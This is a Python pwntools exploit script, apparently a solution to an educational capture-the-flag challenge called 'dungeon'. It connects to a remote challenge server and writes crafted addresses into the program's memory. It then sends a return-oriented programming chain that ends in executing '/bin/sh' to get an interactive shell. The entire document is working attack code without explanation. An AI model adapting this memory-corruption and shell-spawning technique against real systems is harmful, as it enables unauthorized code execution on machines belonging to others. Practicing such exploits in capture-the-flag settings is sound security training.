from pwn import *

#r = process(["./dungeon"])
r = remote("edu-ctf.zoolab.org", 6666)
#r = remote("localhost",4444)
r.sendlineafter("?","TEST")
r.sendafter(":","11"+p64(0x604360+4-3)[:-1])
r.sendafter(":","11"+p64(0x6043a0+4)[:-1])
#r.sendafter(":","x1"+p64(0x6043a4+0x4+1))

context.arch = "amd64"
payload = flat(0x40147b,0x1,0x601f98,0,0x604418,0x200,0x401460)[:-5]
context.log_level = "error"
count = 0
try:
	for p in payload:
		x = process(["./path_solve","255",str(ord(p))])
		sol =  x.recvall()
		x.close()
		for s in sol:
			r.sendafter("action:",s+"1"+p64(0x604a00)[:-1])
		r.sendafter("action:","f1"+p64(0x604a00)[:-1])
		r.sendafter("action:","11"+p64(0x604360+4-3)[:-1])
		r.sendafter("action:","11"+p64(0x6043a0+4)[:-1])

except:
	r.interactive()

r.sendafter(":","q1"+p64(0x6043e0-8)[:-1])

payload = flat(
0x0,0x0,0x1,0x601fb0,0x604a00,0x601f98,0x8,0x401460,
0x0,0x0,0x1,0x601f88,0x604a00,0x7f,0x1,0x401460,
0x0,0x0,0x1,0x601f88,0x3b,0x0,0x0,0x401460,
0x0,0x0,0x1,0x604a00,0x604518,0,0,0x401460,"/bin/sh\x00"
)
r.send(payload)

r.interactive()
